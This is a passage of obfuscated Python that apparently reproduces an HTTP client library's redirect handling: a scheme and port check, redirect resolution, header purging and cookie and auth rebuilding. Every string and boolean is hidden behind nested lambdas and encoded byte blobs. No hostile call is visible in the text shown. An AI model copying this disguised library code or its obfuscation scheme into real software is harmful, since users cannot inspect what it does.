                if old_parsed.scheme == (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))()]))))())())() and old_parsed.port in ((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/P'))(), None) and (new_parsed.scheme == (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()) and (new_parsed.port in ((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\xbb'))(), None)):
                    return (lambda: (lambda 逡勔礓食騘鸩: 逡勔礓食騘鸩 - (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())()
                changed_port = old_parsed.port != new_parsed.port
                changed_scheme = old_parsed.scheme != new_parsed.scheme
                default_port = (DEFAULT_PORTS.get(old_parsed.scheme, None), None)
                if not changed_scheme and old_parsed.port in default_port and (new_parsed.port in default_port):
                    return (lambda: (lambda 讈恗渫允賭藢: 讈恗渫允賭藢 - (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())()
                return changed_port or changed_scheme

            def resolve_redirects(self, resp, req, stream=(lambda: (lambda 彛杴扴胒迮巈: 彛杴扴胒迮巈 - (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())(), timeout=None, verify=(lambda: (lambda 簨嶊沕規鸲麙: 簨嶊沕規鸲麙 + (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())(), cert=None, proxies=None, yield_requests=(lambda: (lambda 阇粂狕绂閉汕: 阇粂狕绂閉汕 - (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())(), **adapter_kwargs):
                hist = []
                url = self.get_redirect_target(resp)
                previous_fragment = urlparse(req.url).fragment
                while url:
                    prepared_request = req.copy()
                    hist.append(resp)
                    resp.history = hist[(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))():]
                    try:
                        resp.content
                    except (ChunkedEncodingError, ContentDecodingError, RuntimeError):
                        resp.raw.read(decode_content=(lambda: (lambda 魗鵱袝錘氽囨: 魗鵱袝錘氽囨 - (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())())
                    if 萻篤抓粯瀊湧(resp.history) >= self.max_redirects:
                        raise TooManyRedirects((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xde'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x11'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x14'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x16'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc7'))()]))))())())().format(self.max_redirects), response=resp)
                    resp.close()
                    if url.startswith((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc8'))()]))))())())()):
                        parsed_rurl = urlparse(resp.url)
                        url = (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd3'))()]))))())())().join([to_native_string(parsed_rurl.scheme), url])
                    parsed = urlparse(url)
                    if parsed.fragment == '' and previous_fragment:
                        parsed = parsed._replace(fragment=previous_fragment)
                    elif parsed.fragment:
                        previous_fragment = parsed.fragment
                    url = parsed.geturl()
                    if not parsed.netloc:
                        url = urljoin(resp.url, requote_uri(url))
                    else:
                        url = requote_uri(url)
                    prepared_request.url = to_native_string(url)
                    self.rebuild_method(prepared_request, resp)
                    if resp.status_code not in (codes.temporary_redirect, codes.permanent_redirect):
                        purged_headers = ((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xdc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe5'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))()]))))())())(), (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xdc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xed'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())(), (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xed'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xff'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xde'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))()]))))())())())
                        for header in purged_headers:
                            prepared_request.headers.pop(header, None)
                        prepared_request.body = None
                    headers = prepared_request.headers
                    headers.pop((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xdc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x04'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())(), None)
                    extract_cookies_to_jar(prepared_request._cookies, req, resp.raw)
                    merge_cookies(prepared_request._cookies, self.cookies)
                    prepared_request.prepare_cookies(prepared_request._cookies)
                    proxies = self.rebuild_proxies(prepared_request, proxies)
                    self.rebuild_auth(prepared_request, resp)
                    rewindable = prepared_request._body_position is not None and ((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xdc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 